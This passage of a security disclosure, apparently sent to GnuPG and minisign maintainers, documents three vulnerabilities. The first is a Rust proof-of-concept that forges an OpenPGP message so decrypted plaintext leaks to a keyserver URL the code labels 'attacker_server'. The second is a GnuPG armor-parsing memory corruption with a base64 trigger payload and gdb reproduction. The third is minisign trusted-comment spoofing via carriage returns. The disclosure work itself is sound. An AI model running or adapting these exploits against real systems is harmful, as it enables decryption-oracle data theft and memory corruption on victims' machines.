 ├── OpenPGP draft comment packet, new CTB, 2 header bytes + 161 bytes
 │       Tag: Unknown Packet 16
 │       Error: Unsupported packet type.  Tag: Unknown Packet 16
 │
 │       00000000  d0                                                 CTB
 │       00000001     a1                                              length
 │       00000002        a1 a1 a1 a1 a1 8b  27 d1 84 ab f2 3b ab d3     ......'....;..
 │       00000010  5a d9 9f 0e 9c 9c 6a 8f  23 32 77 3e b0 23 ef a4   Z.....j.#2w>.#..
 │       00000020  97 5b 2d 03 e4 ea 19 ea  19 a3 02 78 9c 01 48 00   .[-........x..H.
 │       00000030  b7 ff cb 46 62 00 68 b3  53 2f 82 23 ae 35 fe a3   ...Fb.h.S/.#.5..
 │       00000040  66 c7 97 26 8b 4c 24 79  e1 78 84 13 1f 6d cd 4d   f..&.L$y.x...m.M
 │       00000050  08 77 9f 57 eb da ca 77  d8 85 b9 b3 b0 72 1c ea   .w.W...w.....r..
 │       00000060  98 26 0f c7 9f f6 0d f3  5e 0e ab 82 44 7d ff 2c   .&......^...D}.,
 │       00000070  2f e7 6e 5f a2 91 d6 7b  8d 4a e1 12 23 86 d3 14   /.n_...{.J..#...
 │       00000080  46 b1 3f 5d 58 91 d1 6d  00 da 7a d4 1a 6d 7e ec   F.?]X..m..z..m~.
 │       00000090  30 59 06 ee a3 a3 a3 a3  a3 a3 a3 a3 a3 a3 a3 a3   0Y..............
 │       000000a0  a3 a3 a3                                           ...
 │
 ├── Public-Key Packet, new CTB, 2 header bytes + 51 bytes
 │       [...]
 │
 ├── Signature Packet, new CTB, 3 header bytes + 371 bytes
 │       Version: 4
 │       Type: DirectKey
 │       Pk algo: EdDSA
 │       Hash algo: SHA512
 │       Hashed area:
 │         [...]
 │       Unhashed area:
 │         Preferred keyserver: "http://localhost:9999/upload-key?x=%OMITTED%"
 │       Digest prefix: 8C5D
 │       Level: 0 (signature over data)
 │
 │       00000000  c2                                                 CTB
 │       00000001     c0 b3                                           length
 │       00000003           04                                        version
 │       [...]
 │       0000008c                                       00 a2         unhashed_area_len
 │       0000008e                                             a1      subpacket length
 │       0000008f                                                18   subpacket tag
 │       00000090  68 74 74 70 3a 2f 2f 6c  6f 63 61 6c 68 6f 73 74   pref key server
 │       000000a0  3a 39 39 39 39 2f 75 70  6c 6f 61 64 2d 6b 65 79
 │       000000b0  3f 78 3d 8f 23 32 77 3e  b0 23 ef a4 97 5b 2d 03
 │       000000c0  e4 ea 19 ea 19 a3 02 78  9c 01 48 00 b7 ff cb 46
 │       000000d0  62 00 68 b3 53 2f 82 23  ae 35 fe a3 66 c7 97 26
 │       000000e0  8b 4c 24 79 e1 78 84 13  1f 6d cd 4d 08 77 9f 57
 │       000000f0  eb da ca 77 d8 85 b9 b3  b0 72 1c ea 98 26 0f c7
 │       00000100  9f f6 0d f3 5e 0e ab 82  44 7d ff 2c 2f e7 6e 5f
 │       00000110  a2 91 d6 7b 8d 4a e1 12  23 86 d3 14 46 b1 3f 5d
 │       00000120  58 91 d1 6d 00 da 7a d4  1a 6d 7e ec 30 59 06 ee
 │       00000130  8c                                                 digest_prefix1
 │       00000131     5d                                              digest_prefix2
 │       00000132        00 ff                                        eddsa_sig_r_len
 │       00000134              42 0b d7 a1  c2 92 cc 4c c7 10 d0 8b   eddsa_sig_r
 │       00000140  67 3a 43 ef 3f 94 c6 31  1d f6 4c 41 b4 7d da a9
 │       00000150  45 e9 8c 4c
 │       00000154              00 fe                                  eddsa_sig_s_len
 │       00000156                    30 85  30 6f d3 45 75 4d 4a 96   eddsa_sig_s
 │       00000160  1f 05 b5 15 49 e3 73 10  e2 9c 9e 75 40 f1 0b 08
 │       00000170  6b 46 6c aa c8 01
 │
 ├── User ID Packet, new CTB, 2 header bytes + 7 bytes
 │       Value: Mallory
 │
 │       00000000  cd                                                 CTB
 │       00000001     07                                              length
 │       00000002        4d 61 6c 6c 6f 72  79                        value
 │
 └── [...]

   GnuPG parses it the same way:

 # off=0 ctb=a3 tag=8 hlen=1 plen=0 indeterminate
 :compressed packet: algo=1
 # off=2 ctb=d0 tag=16 hlen=2 plen=161 new-ctb
 :OpenPGP draft comment packet: "¡¡¡¡¡'Ñ«ò;«ÓZÙ.j#2w>°#ï¤[-.äê.ê.£.x.H.·ÿËFb.h³S/#®5þ£fÇ&L$yáx..mÍM.wWë� ÊwØ¹³°r.ê&.Çö
 ó^.«D}ÿ,/çn_¢Ö{Já.#Ó.F±?]XÑm.� zÔ.m~ì0Y.î£££££££££££££££"
 # off=165 ctb=c6 tag=6 hlen=2 plen=51 new-ctb
 :public key packet:
         version 4, algo 22, created 1756825986, expires 0
         pkey[0]: [80 bits] ed25519 (1.3.6.1.4.1.11591.15.1)
         pkey[1]: [263 bits]
         keyid: FAE0D448DABC939C
 # off=218 ctb=c2 tag=2 hlen=3 plen=371 new-ctb
 :signature packet: algo 22, keyid FAE0D448DABC939C
         version 4, created 1756825986, md5len 0, sigclass 0x1f
         digest algo 10, begin of digest 8c 5d
         critical hashed subpkt 2 len 4 (sig created 2025-09-02)
         critical hashed subpkt 9 len 4 (key expires after 2y362d0h0m)
         hashed subpkt 11 len 2 (pref-sym-algos: 9 7)
         hashed subpkt 16 len 8 (issuer key ID FAE0D448DABC939C)
         hashed subpkt 20 len 70 (notation: [email protected]=[not human readable])
         hashed subpkt 21 len 2 (pref-hash-algos: 10 8)
         critical hashed subpkt 27 len 1 (key flags: 01)
         hashed subpkt 30 len 1 (features: 09)
         hashed subpkt 33 len 21 (issuer fpr v4 BDCD90FCBC64D23C56A3A0C1FAE0D448DABC939C)
         subpkt 24 len 160 (preferred keyserver: http://localhost:9999/upload-key?x=%OMITTED%)
         data: [255 bits]
         data: [254 bits]
 # off=592 ctb=cd tag=13 hlen=2 plen=7 new-ctb
 :user ID packet: "Mallory"

   And when asked to sign the key, to upload it to a keyserver, or to refresh
   it from the preferred keyserver, the plaintext (which is a compressed
   packet, making it appear garbled, but that is the decrypted text!) is
   leaked.

   The payload is generated with this code:

 use std::env::args;
 use deflate::encoder_state::EncoderState;
 use deflate::lzvalue::{LZType, StoredLength};
 use sequoia_openpgp::{Message, Packet, PacketPile};
 use sequoia_openpgp::packet::{Signature, Tag, SEIP};
 use sequoia_openpgp::packet::Body::Unprocessed;
 use sequoia_openpgp::parse::Parse;
 use hex_literal::hex;/
 use sequoia_openpgp::cert::CertBuilder;
 use sequoia_openpgp::packet::header::{BodyLength, CTBNew};
 use sequoia_openpgp::packet::signature::subpacket::{Subpacket, SubpacketValue};
 use sequoia_openpgp::serialize::{Marshal};
 use sequoia_openpgp::types::{CompressionAlgorithm, SignatureType};

 fn main() {
     let input_file = args().nth(1).expect("No valid input file");
     let message = Message::from_file(input_file).expect("Input file cannot be opened");
     let Some(Packet::SEIP(SEIP::V1(mut seip))) = message.packets().children().find(|x| x.tag() == Tag::SEIP).cloned() else { panic!("Invalid input") };
     let Unprocessed(ct) = seip.body().clone() else { panic!("wtf") };

     let ct_align_padding = 16 - ct.len() % 16;
     let mut out_pkgs = message.packets().children().filter(|x| x.tag() != Tag::SEIP).cloned().collect::<Vec<_>>();

     // head -c64 /dev/urandom | gpg -e -r online | sq packet dump --hex
     let mut pt_comp_gpg_reference = hex!(/*
         ├── Compressed Data Packet, old CTB, 2 header bytes + indeterminate length
         │   │   Algorithm: ZLIB
         │   │
         │   │   00000000 */" a3                                               "/*  CTB
         │   │   00000001 */"    02                                            "/*  algo
         │   │   00000002 */"       78 9c 01 48 00 b7  ff cb 46 62 00 68 b3 52 "/*    x....w...b.h./
     */);

     // 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # IV
     // [implicit]
     // ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ?? # "IV"
     // ?? ??                                            # Protection bytes
     //       a3 01                                      # comp pkt alg=DEFLATE
     //             00 NN NN ~N  ~N                      # DF store len=NN
     //                             d0 NN                # comment pkt len=NN
     //                                   00 00 00 00 00 # garbage
     // xx xx xx xx xx xx xx xx  xx xx xx xx xx xx xx xx # CFB write gadget
     // 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # reset IV
     // CT CT CT CT CT CT CT CT  CT CT CT CT CT CT CT CT # entire ciphertext
     // [IOBUF EOF, pop decryption filter]
     // [DF store 0] [DF store 0] [DF store 0] [DF store 0] [...nop sled...]
     // [DF store]
     //     [PGP public key until unhashed subpackets]
     // [DF compressed]
     //     [LengthDistance pointing to decrypted data in compression buffer]
     // [DF store]
     //     [Rest of PGP public key]

     let mut xb_change = vec![];
     let mut xb_pt_crib = vec![];

     // ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ?? # "IV"
     xb_pt_crib.append(&mut vec![0; 16]);
     xb_change.append(&mut vec![0; 16]);

     // ?? ??                                            # Protection bytes
     xb_pt_crib.append(&mut vec![0; 2]);
     xb_change.append(&mut vec![0; 2]);

     xb_pt_crib.append(&mut pt_comp_gpg_reference.to_vec());
     //       a3 01                                      # comp pkt alg=DEFLATE
     xb_change.push(pt_comp_gpg_reference[0]);
     xb_change.push(CompressionAlgorithm::Zip.into());

     // data packets start here
     let until_eob = 16 - (xb_change.len() % 16);
     let len_cur_pos = xb_change.len();
     let mut len = until_eob + 16 /*IV*/ + ct.len() + 0 /*MDC*/ + 16 /*EOF trampoline*/;
     let mut store_buf = vec![];

     //                             d0 NN                # comment pkt len=NN
     CTBNew::new(Tag::Unknown(16)).serialize(&mut store_buf).unwrap();
     BodyLength::Full((len - 5 - 2 - 1 /*EOF*/) as u32).serialize(&mut store_buf).unwrap();

     //             00 NN NN ~N  ~N                      # DF store len=NN
     let mut deflate_state = EncoderState::new(vec![]);
     deflate_state.set_huffman_to_fixed();
     store_buf.resize(len - 5 - 1 /*EOF*/, 0xa1);
     write_uncomp(&mut deflate_state, &mut store_buf, false);
     // deflate::stored_block::write_stored_header(&mut deflate_state.writer, false);
     // deflate::stored_block::compress_block_stored(&store_buf, &mut deflate_state.writer).unwrap();

     //-            00 NN NN ~N  ~N                      # DF store len=NN

     //                                   00 00 00 00 00 # garbage till EoB
     xb_change.append(&mut deflate_state.inner_vec()[0..until_eob].to_vec());

     // CFB write gadget
     let mut ct_mal = xb_change.iter()
         .zip(xb_pt_crib.iter())
         .zip(ct.iter())
         .map(|((a, b), c)| a ^ b ^ c)
         .collect::<Vec<_>>();

     assert_eq!(ct_mal.len() % 16, 0);

     // 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # reset IV
     ct_mal.append(&mut vec![0; 16]);

     assert_eq!(ct_mal.len() % 16, 0);

     // CT CT CT CT CT CT CT CT  CT CT CT CT CT CT CT CT # entire ciphertext
     ct_mal.append(&mut ct.clone());

     // 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 # pad 22By for MDC
     ct_mal.append(&mut vec![0xa2; 22]);
     assert_eq!(len_cur_pos + len, ct_mal.len() + 16 /*trampoline*/ - 22 /*MDC*/);

     ct_mal.chunks(16).for_each(|x| println!("{:02x?}", x));

     seip.set_body(Unprocessed(ct_mal));
     out_pkgs.push(Packet::from(seip));

     let mut out_buf = vec![];

     PacketPile::from(out_pkgs).serialize(&mut out_buf).unwrap();

     // [IOBUF EOF trampoline, pop decryption filter]
     out_buf.append(&mut vec![0xa3; 16 - 1 /*eof*/]);
     let deflate_pos = deflate_state.inner_vec().len();

     // [DF store 0] [DF store 0] [DF store 0] [DF store 0] [...nop sled...]
     // for _ in 0..5 {
     //     // write_uncomp(&mut deflate_state, &mut vec![0xd0, 0], false);
     // }

     // [DF store [PGP public key until unhashed subpackets]]
     // [DF compressed [LengthDistance pointing to decrypted data in compression buffer]
     // [DF store [Rest of PGP public key]]

     len = ct.len();

     let mut pub_buf = vec![];
     let attacker_server = "http://localhost:9999/upload-key?x=";

     let (cert, _) = CertBuilder::general_purpose(["Mallory"]).generate().unwrap();
     cert.into_packets().map(|mut x| {
         if let Packet::Signature(Signature::V4(ref mut s)) = x && s.typ() == SignatureType::DirectKey {
             let mut placeholder = attacker_server.as_bytes().to_vec();
             placeholder.append(&mut vec![0; len]);
             s.unhashed_area_mut().add(Subpacket::new(SubpacketValue::PreferredKeyServer(placeholder), false).unwrap()).unwrap();
         }
         x
     }).collect::<PacketPile>().serialize(&mut pub_buf).unwrap();

     let pub_start = pub_buf.windows(attacker_server.len()).enumerate()
         .find(|(p, s)| attacker_server.as_bytes().eq(*s)).unwrap().0;

     let at_len = pub_start + attacker_server.len();

     // [DF store [PGP public key until unhashed subpackets]]

     write_uncomp(&mut deflate_state, &mut pub_buf[0..(at_len)].to_vec(), false);

     let cur_pos = deflate_state.inner_vec().len() as u16;

     // [DF store [PGP public key until unhashed subpackets]]

     deflate_state.write_start_of_block(true, false);
     deflate_state.write_lzvalue(LZType::StoredLengthDistance(
         StoredLength::new(len as u8 - 3),
         (ct.len() + at_len + 15 /*eof trampoline*/) as u16
     ));
     deflate_state.write_end_of_block();

     // [DF store [Rest of PGP public key]]

     write_uncomp(&mut deflate_state, &mut pub_buf[(pub_start + attacker_server.len() + len)..].to_vec(), false);

     write_uncomp(&mut deflate_state, &mut vec![0xd0, 0], true);

     out_buf.append(&mut deflate_state.inner_vec()[(deflate_pos)..].to_vec());

     out_buf.chunks(16).for_each(|x| println!("{:02x?}", x));
     std::fs::write("./result", out_buf).unwrap();

     fn write_uncomp(es: &mut EncoderState, buf: &mut Vec<u8>, fin: bool) {
         deflate::stored_block::write_stored_header(&mut es.writer, fin);
         deflate::stored_block::compress_block_stored(buf, &mut es.writer).unwrap();
     }
 }

 [package]
 name = "enc-poc"
 version = "0.1.0"
 edition = "2024"

 [dependencies]
 sequoia-openpgp = "2.0.0"
 reqwest = { version = "0.11", features = ["json", "blocking"] }
 hex-literal = "1.0"
 deflate = { git = "https://github.com/49016/deflate-rs-internals" }

References

   Visible links
   . https://datatracker.ietf.org/doc/html/rfc9580#section-5.13.1-6

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="05-memcpy.txt"
Content-Transfer-Encoding: 8bit

                    Memory Corruption in ASCII-Armor Parsing

   There exist memory corruptions in the armor parsing code of GnuPG that can
   be exploited to provide primitives like out of bounds buffer read and
   write. This might be exploitable to the point of remote code execution
   (RCE).

Impact

   While this may allow remote code execution (RCE), it definitively causes
   memory corruption.

Details

   The root cause of this vulnerability is straightforward and described in
   the first part of this section. After that, we show how this bug is
   reachable. Finally we present the downstream impacts leading to useful
   exploitation primitives.

   This bug opens up a very large space of exploitation surface in a stateful
   way. We present some, but by no means all, possible exploitation
   primitives. In the interest of a timely disclosure and patch we do not
   present full exploit chain demonstrating RCE.

   The function armor_filter (involved in all ASCII-armor parsing), has a
   bug. The loop increments the variable n both in the loop head [1] and the
   loop body [2]. While this leads to uninitialized memory and a buffer
   overwrite by up to one, the more impactful problem is setting *ret_len to
   a value greater than the requested size. Note that the ret_len pointer
   here is used as an input and output parameter.

   In summary, if control == IOBUFCTRL_UNDERFLOW && afx->inp_bypass ([3]) is
   true, then *ret_len (at [4]) is greater than the requested size ([5]).

 /****************
  * This filter is used to handle the armor stuff
  */
 static int
 armor_filter(void *opaque, int control,
              IOBUF a, byte *buf, size_t *ret_len) {
     size_t size = *ret_len; // <-- [5]
 // ...
     if (control == IOBUFCTRL_UNDERFLOW && afx->inp_bypass) {  // <-- [3]
         n = 0;
         if (afx->buffer_len) {
             /* Copy the data from AFX->BUFFER to BUF.  */
             for (; n < size && afx->buffer_pos < afx->buffer_len; n++) // <-- [1]
                 buf[n++] = afx->buffer[afx->buffer_pos++]; // <-- [2]
             if (afx->buffer_pos >= afx->buffer_len)
                 afx->buffer_len = 0;
         }
         /* If there is still space in BUF, read directly into it.  */
         for (; n < size; n++) {
             if ((c = iobuf_get(a)) == -1)
                 break;
             buf[n] = c & 0xff;
         }
         if (!n)
             /* We didn't get any data.  EOF.  */
             rc = -1;
         *ret_len = n; // <-- [4]

   Invoking the function with *ret_len = 1023 (input) and afx->buffer_len >
   511 causes the loop to increment beyond the limit. This is a pseudo code
   trace of the triggered behavior.

 (n = 0) < (size = 1023) && (afx->buffer_pos = 0) < (afx->buffer_len = 512)
   buf[(n++ = 1, return 0)] = afx->buffer[(afx->buffer_pos++ = 1, return 0)];
 (n++ = 2)

 (n = 2) < (size = 1023) && (afx->buffer_pos = 1) < (afx->buffer_len = 512)
   buf[(n++ = 3, return 2)] = afx->buffer[(afx->buffer_pos++ = 2, return 1)];
 (n++ = 4)

 [...]

 (n = 1022) < (size = 1023) && (afx->buffer_pos = 511) < (afx->buffer_len = 512)
   buf[(n++ = 1023, return 1022)] = afx->buffer[(afx->buffer_pos++ = 512, return 511)];
 (n++ = 1024)

   For typical inputs, the inp_bypass flag is zero, rendering this branch
   effectively dead code. However, a specially crafted malformed packet can
   trigger this condition in GnuPG.

   For context, afx->inp_bypass is a flag that is set if the input is
   determined to be a binary payload instead of armored data. The armor
   filter is only pushed to the filter stack if the input is determined to be
   actually armored though. For readers unfamiliar with the input processing
   in GnuPG using filters we refer to this code comment and related code. The
   common pattern for using the armor filter is the following:

 if (!opt.no_armor) {
     if (use_armor_filter(fp)) {
         afx = new_armor_context();
         push_armor_filter(afx, fp);
     }
 }

   use_armor_filter does some rudimentary checks to see if pushing an armor
   filter is necessary:

 /****************
  * Try to check whether the iobuf is armored
  * Returns true if this may be the case; the caller should use the
  *         filter to do further processing.
  */
 int
 use_armor_filter(IOBUF a) {
     byte buf[2];
     int n;

     /* fixme: there might be a problem with iobuf_peek */
     n = iobuf_peek(a, buf, 2);
     if (n == -1)
         return 0; /* EOF, doesn't matter whether armored or not */
     if (!n)
         return 1; /* can't check it: try armored */
     if (n != 2)
         return 0; /* short buffer */
     return is_armored(buf);
 }

   From this we conclude that we need to provide an input satisfying
   is_armored on push. As such, we start our payload with standard armored
   (base64 encoded) data.

   Our goal is to eventually get afx->inp_bypass to 1, but the setter has the
   following condition:

 /* figure out whether the data is armored or not */
 static int
 check_input( armor_filter_context_t *afx, IOBUF a ) {
     // ...
     /* read the first line to see whether this is armored data */
     len = afx->buffer_len = iobuf_read_line( a, &afx->buffer,
                                              &afx->buffer_size, &maxlen );
     // ...
     else if (len >= 2 && !is_armored(line)) {
         afx->inp_checked = 1;
         afx->inp_bypass = 1;
         return 0;
     }
     // ...
 }

   So if is_armored returns true, the condition above fails, and if it is
   false, use_armor_filter returns false, and the armor filter does not get
   pushed in the first place.

   With ordinary or basic malformed inputs, the root cause bug seems
   unreachable. However, a specifically crafted payload can manipulate the
   state of the parser to trigger it anyway: We start with valid
   ASCII-armored data in a “BEGIN PGP MESSAGE” and then without an “END
   PGP MESSAGE” (i.e. popping the filter) we follow it up with a binary
   payload at a specific location described in the following. This will lead
   to us reentering the check_input function.

   The function that contains the snippet above, check_input, is only called
   if afx->inp_checked = 0. GnuPG uses this flag to store whether it has
   already determined the input format. However, the if (checkcrc) branch in
   radix64_read resets it under certain conditions. For context: PGP messages
   optionally contain an error correction code (CRC) at the end. Note, we
   believe that GnuPG resets afx->inp_checked here assuming that the CRC must
   be the end of the message, always followed by the “END PGP MESSAGE”
   marker. However, the filter for this current message is not popped yet.

 static int
 radix64_read(armor_filter_context_t *afx, IOBUF a, size_t *retn,
              byte *buf, size_t size) {
     // ...
     if (checkcrc) {
         gcry_md_final(afx->crc_md);
         afx->any_data = 1;
         afx->inp_checked = 0;
         afx->faked = 0;
     // ...
 }

   Visually, this check happens here, the last ’=’ character after the
   base64 encoded data marks the start of the CRC checksum data, in the
   following we refer to this position as buffer_pos.

 =====BEGIN [type]=====
 BASE64BASE64BASE64
 BASE64BASE64BASE64
 BASE64BASE64BASE64
 {buffer_pos}=CRC
 =====END [type]=====

   At this point the condition is set, and only the end mark (=), the
   (optional) CRC, and the newline are consumed. After that, the underflow
   handler returns, leaving in the buffer:

 =====END [type]=====

   Which gets checked as armor, and due to it being a valid armor line, the
   input re-check does nothing unusual. However, we can construct a message
   like this:

 =====BEGIN [type]=====
 BASE64BASE64BASE64
 BASE64BASE64BASE64
 BASE64BASE64BASE64
 {buffer_pos}=CRC
 [binary message]

   Which, after reading the base64 and CRC, gets an underflow on the
   following buffer with afx->inp_checked == 0:

 [binary message]

   And this, when fulfilling any of the conditions in check_input, gets
   detected as a binary message, and the at-first-sight “dead”
   afx->inp_bypass in armor_filter branch suddenly gets executed. The control
   code IOBUFCTRL_UNDERFLOW is the regular control code that the armor filter
   is invoked with, processing data chunk-by-chunk.

   This alone is still not enough for exploitation, though: Directly after
   the call to check_input, a branch fills the afx->buffer:

 rc = check_input(afx, a);
 if (afx->inp_bypass) {
     for (n = 0; n < size && afx->buffer_pos < afx->buffer_len;)
         buf[n++] = afx->buffer[afx->buffer_pos++];
     if (afx->buffer_pos >= afx->buffer_len)
         afx->buffer_len = 0;
     if (!n)
         rc = -1;
 }

   This code is very similar to the double-increment code, with the small
   change that it does not have the double-increment bug, so we actively have
   to avoid it consuming the entire buffer, for exploitation.

   We can only write to the buffer once, as it contains the buffered part of
   the current line that was read by iobuf_read_line. This function is always
   called with a limit <= MAX_LINELEN, which in production builds is 20000.

   However, since a consumer of the iobuf pipeline cannot know a size
   beforehand, a complete fill of the iobuf buffer is requested, which is
   defined as DEFAULT_IOBUF_BUFFER_SIZE, in production builds 65536.

   This, again, seems like it would not be possible to exploit, but can be
   bypassed with a carefully constructed input: Our payload currently
   consists of an armored message, followed by a binary message. By making
   the armored message parse into > DEFAULT_IOBUF_BUFFER_SIZE bytes output,
   and including a message that claims a size of < MAX_LINELEN in its header,
   the 2nd IOBUFCTRL_UNDERFLOW will request a size < MAX_LINELEN that will
   get processed by the single-increment code, leaving unconsumed bytes in
   the buffer for the 3rd IOBUFCTRL_UNDERFLOW call that will get processed by
   the double-increment code (afx->inp_checked is again true at this point).

   In summary, our payload is structured as follows:

 [ASCII "=====BEGIN PGP MESSAGE====="] [ASCII "\n"]
 [Base64 [65536 bytes of [Packet len=67000]]] [ASCII "\n"]
 [ASCII "="] [ASCII "\n"]
 [binary payload]

   The parser will:

     * Check for armor

          * Find armor
          * Push armor filter

   The 1st IOBUFCTRL_UNDERFLOW on the armor filter will:

     * See a request for 65536 bytes
     * Do check_input as afx->inp_checked is 0

          * Consume [ASCII "=====BEGIN PGP MESSAGE=====" "\n"]

               * Set afx->inp_checked to 1
               * Set afx->inp_bypass to 0

     * Do radix64_read as afx->inp_bypass is 0

          * Consume 65536 bytes of [Base64 [65536 bytes of [Packet
            len=67000]]] [ASCII "\n"]
          * Consume [ASCII "="] [ASCII "\n"] (we do not set the optional CRC)

               * Set afx->inp_checked to 0

     * Return with *ret_len=65536

   The parser now runs and sees a packet with len=67000, and 65536 bytes
   available, so it underflows (IOBUFCTRL_UNDERFLOW) for 1464 bytes.

   The 2nd IOBUFCTRL_UNDERFLOW will:

     * See a request for 1464 bytes
     * Do check_input as afx->inp_checked is 0

          * See no armor
          * Set afx->inp_checked to 1
          * Set afx->inp_bypass to 1

     * Read and return 1464 bytes from afx->buffer with the single-increment
       code
     * Return with *ret_len=1464

   The 3rd IOBUFCTRL_UNDERFLOW will:

     * See a request for n bytes
     * Go into the && afx->inp_bypass branch
     * Read and return n bytes from afx->buffer with the double-increment
       code
     * Return with *ret_len=n + (1 - (n % 2))

   With this specific setup, the underflow will report a read value/ret_len
   higher than the requested value. This state should never happen, and
   various places in the code, including memory-safety relevant guards,
   assume (but not assert) that this will never be the case. This triggers
   various (buffer size/position related) integer underflows and direct
   memory safety issues, for example (line comments added by us):

 needed = size < a->size ? size : a->size;
 c = iobuf_read(chain, p, needed);
 if (c < needed) {
   if (c == -1)
     c = 0;
   log_error
   ("block_filter %p: read error (size=%lu,a->size=%lu)\n",
    a, (ulong) size + c, (ulong) a->size + c);
   rc = GPG_ERR_BAD_DATA;
 } else {
   size -= c; // write buffer offset underflow
   a->size -= c; // read buffer offset underflow
   p += c;
   n += c;
 }

 size_t temp_size = iobuf_set_buffer_size(0) * 1024;
 byte *buffer = xmalloc(temp_size);
 int ret;

 while ((ret = iobuf_read(fp, buffer, temp_size)) != -1) {
     if (md)
         gcry_md_write(md, buffer, ret); // heap buffer overread
 }

 ret = iobuf_read(stream, &buffer[nread], curr);
 if (ret == -1) {
     dfx->eof_seen = 3; /* Premature EOF. */
     break;
 }

 nread += ret;
 dfx->length -= ret; // read buffer offset underflow

 temp = xmalloc(temp_size);
 while (1) {
   nread = iobuf_read(source, temp, temp_size);
   if (nread == -1)
     /* EOF.  */
     break;

   if (nread > max_read)
     max_read = nread;

   err = iobuf_write(dest, temp, nread); // buffer overread
   if (err)
     break;
   nwrote += nread;
 }

 /* Burn the buffer.  */
 if (max_read)
   wipememory(temp, max_read); // buffer overflow

   Those are just a few obvious examples, but due to GnuPG’s entire iobuf
   architecture relying on the fact that the return size should never be
   bigger than the requested size, state corruption cascades throughout the
   entire program. From here it is a challenge in memory corruption
   exploitation with a very large space of reachable primitives.

Detailed steps to reproduce

  Scenario

   Mallory sends Alice a message, or Mallory intercepts an untrusted message
   between Alice and Bob. The result of the operation and the integrity of
   the system used is now compromised.

  Procedure

   A very basic PoC demonstrating that the faulty double-increment code is
   reachable in production builds of GnuPG is provided:

 cd $(mktemp -d)
 curl -O https://www.gnupg.org/ftp/gcrypt/gnupg/gnupg-2.4.8.tar.bz2
 tar xf gnupg-2.4.8.tar.bz2
 cd gnupg-2.4.8/
 mkdir build; (cd build; CFLAGS="-g -O0" ../configure; make)

 (base64 -d | gunzip | gunzip > poc) <<===
 H4sIAAAAAAACA5Pv5mCo1tqewcT89oIhX5ODQNvFG+c0t5lL+yVsPMbqKcC5/QPLsXnN3e4C0j73
 sv+fCfc5t7r47S9D37tTTtXsPv910q26FfNV3ff0PV5cOe3qVk1pl58TG0YBheDAdPHlEXwMZIPd
 wnEMQwp8SL8n1flI9v57FgYAcfj03ZICAAA=
 ===

 gdb
   -ex "b armor.c:$(grep -n 'buffer_len; n++' g10/armor.c | cut -d: -f1)"
   -ex r -ex 'display n' -ex n -ex n -ex n -ex n -ex n
   --args ./build/bin/gpg -o- --dearmor poc

   Which prints:

 GNU gdb (GDB) 16.3
 [snip]
 Reading symbols from ./build/bin/gpg...
 Breakpoint 1 at 0x450550: file ../../g10/armor.c, line 1305.
 Starting program: /tmp/poc/gnupg-2.4.8/build/bin/gpg -o- --dearmor poc
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/nix/store/8p33is69mjdw3bi1wmi8v2zpsxir8nwd-glibc-2.40-66/lib/libthread_db.so.1".

 Breakpoint 1, armor_filter (opaque=0x573be0, control=3, a=0x5744f0, buf=0x58da20 "", ret_len=0x7fffffff4208) at ../../g10/armor.c:1305
 1305                for(; n < size && afx->buffer_pos < afx->buffer_len; n++ )
 1: n = 0
 1306                    buf[n++] = afx->buffer[afx->buffer_pos++];
 1: n = 0
 1305                for(; n < size && afx->buffer_pos < afx->buffer_len; n++ )
 1: n = 1
 1306                    buf[n++] = afx->buffer[afx->buffer_pos++];
 1: n = 2
 1305                for(; n < size && afx->buffer_pos < afx->buffer_len; n++ )
 1: n = 3
 1306                    buf[n++] = afx->buffer[afx->buffer_pos++];
 1: n = 4
 (gdb)

Recommendation

   Aside from fixing the obvious demonstrated vulnerability, the core issue
   here should be addressed: Much of the memory safety related code makes
   assumptions about the state of the program, but does not assert them.

   This vulnerability demonstrates one source for state corruption, and shows
   several exploitation sink examples, but those are just concrete examples;
   the codebase, especially iobuf code and iobuf consumers, have several
   similar suspicious state assumptions, with some being (incorrectly)
   documented as correct, and some not even explicitly documented, yet no
   actual assertion happens. State corruption propagates easily and cascades
   far through the code, often because the code assumes that the rest of the
   code is bug-free, but as demonstrated above real bugs can happen and
   propagate. In the case of the iobuf system, both filters/iobuf itself and
   consumers of the iobuf API should have defense-in-depth assertions that
   the critical assumptions hold.

References

   Visible links
   . https://github.com/gpg/gnupg/blob/master/common/iobuf.h#L34-L90

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="06-minisign.txt"
Content-Transfer-Encoding: 8bit

                      Trusted comment injection (minisign)

   A vulnerability in minisign allows attackers to modify a signature in a
   way that could deceive users about the content of a trusted comment.

Impact

   A minisign signature file can be modified in a way that it still verifies,
   but the trusted comment appears to be extended, when displayed through
   most text viewing programs, though not minisign itself.

Details

   To parse and load a minisign signature file (.minisig), minisign
   implements a function sig_load. It fgets the trusted comment and calls a
   function trim with the contents of the line.

     if (fgets(trusted_comment, (int) trusted_comment_maxlen, fp) == NULL) {
         exit_msg("Trusted comment not present");
     }
     if (strncmp(trusted_comment, TRUSTED_COMMENT_PREFIX, (sizeof TRUSTED_COMMENT_PREFIX) - 1U) !=
         0) {
         exit_msg(
             "Trusted signature comment should start with "
             "\"" TRUSTED_COMMENT_PREFIX "\"");
     }
     memmove(trusted_comment,
             trusted_comment + sizeof TRUSTED_COMMENT_PREFIX - 1U,
             strlen(trusted_comment + sizeof TRUSTED_COMMENT_PREFIX - 1U) + 1U);
     if (trim(trusted_comment) == 0) {
         exit_msg("Trusted comment too long");
     }

   fgets is

     Reading stops after an EOF or a newline. If a newline is read, As such,
     it skips over ‘\r’ characters. trim replaces all occurrences of
     ‘\n’ and ‘\r’ characters with null bytes. Therefore, ‘\r’
     characters can occur in the middle of the trusted comment.

 int
 trim(char *str)
 {
     size_t i = strlen(str);
     int    t = 0;

     while (i-- > (size_t) 0U) {
         if (str[i] == '\n') {
             str[i] = 0;
             t      = 1;
         } else if (str[i] == '\r') {
             str[i] = 0;
         }
     }
     return t;
 }

   The premature null byte termination later leads to only the part before
   the (first) ‘\r’ being hashed and contributing to the signed content
   during verification.

     trusted_comment_len     = strlen(trusted_comment);
